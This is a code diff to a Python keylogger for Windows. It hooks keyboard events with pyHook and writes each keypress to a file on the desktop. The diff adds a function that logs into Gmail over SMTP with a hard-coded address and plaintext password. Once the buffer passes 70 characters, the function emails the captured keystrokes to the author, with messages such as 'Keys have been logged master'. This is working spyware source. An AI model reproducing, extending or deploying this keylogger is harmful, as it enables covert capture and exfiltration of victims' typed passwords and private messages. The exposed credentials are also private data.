@@ -1,12 +1,52 @@
 import pyHook,pythoncom,sys,logging
+import smtplib
+from email.mime.text import MIMEText
 
-file_log = 'C:\\Users\\wembl\\Desktop\\keys.txt'
+file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','w+')
+buffer = file_log.read()
+file_log.close()
+
+def sendEmail(keyMessage):
+    try:
+        fromaddr = 'keyhunter.hackspc@gmail.com'
+        username = 'wembleywilliams@gmail.com'
+        password = 'leonardo16'
+        keyMessage += "<br><br>" + "Keys have been logged master"
+        msg = MIMEText(keyMessage,'html')
+        msg['Subject'] = "Simple Key Logger"
+        msg['Reply-to'] = 'no-reply'
+        msg['To'] = 'wembleywilliams@gmail.com'
+        server = smtplib.SMTP('smtp.gmail.com:587')
+        server.starttls()
+        server.login(username, password)
+        server.sendmail(fromaddr, ['wembleywilliams@gmail.com'], msg.as_string())
+        server.quit()
+
+    except:
+        print "Error sending email to hacker!!!"
+
+    return True
 
 def OnKeyboardEvent(event):
-    logging.basicConfig(filename=file_log,level=logging.DEBUG, format ='%(message)s')
-    chr(event.Ascii)
-    logging.log(10,chr(event.Ascii))
+    file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','r+')
+    buffer = file_log.read()
+    file_log.close()
+    if len(buffer) > 70:
+        sendEmail(buffer[-1000:].replace("\n", "<br>"))
+
+    file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt',  'w')
+    keylogs = chr(event.Ascii)
+    # if user press ENTER
+    if event.Ascii == 13:
+        keylogs = '\n'
+    # if user press space
+    if event.Ascii == 32:
+        keylogs = '  '
+    buffer += keylogs
+    file_log.write(buffer)
+    file_log.close()
     return True
+
 #Create hook manager project
 hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown = OnKeyboardEvent
